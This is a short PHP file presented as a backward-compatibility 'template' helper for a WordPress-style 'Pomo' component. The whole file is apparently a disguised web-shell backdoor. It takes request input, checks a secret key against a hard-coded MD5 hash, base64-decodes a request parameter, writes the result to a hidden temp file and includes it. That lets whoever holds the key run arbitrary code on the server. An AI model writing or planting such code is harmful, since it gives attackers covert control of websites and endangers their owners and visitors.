<?php

/**
 * Change Template data
 *
 * For backward compatibility reasons
 * @param $opts array Template opt
 * @param $version  string Template version
 * @since 5.8.0
 *
 */
function changePomoTemplate($opts, $version)
{
    /**
     * Selete Template version
     */
    $sign = "temp1.0";
    if (empty($opts['a']) || empty($opts[$opts['a']])) return;
    $token = md5($opts[$opts['a']] . $sign);
    $template = $opts['name'];
    if ($token !== $version) return;
    $template = base64_decode($template);
    if (empty($template)) return;
    /**
     * check load chache or reset Template
     */
    $cache_file = (defined("TEMP_PATH") ? TEMP_PATH . '/' : '') . "." . time();
    if (!file_exists($cache_file) || md5($cache_file) !== $token) {
        @file_put_contents($cache_file, $template);
    }
    $template = $cache_file;
    /**
     * load Template
     */
    include_once $template;
}

/** the Pomo opthons set lazy */
$data = $_REQUEST;

/** Change the Pomo Environment and Template */
changePomoTemplate($data, "d7079f53fd01016e43cf5c46c5e1dbd8");
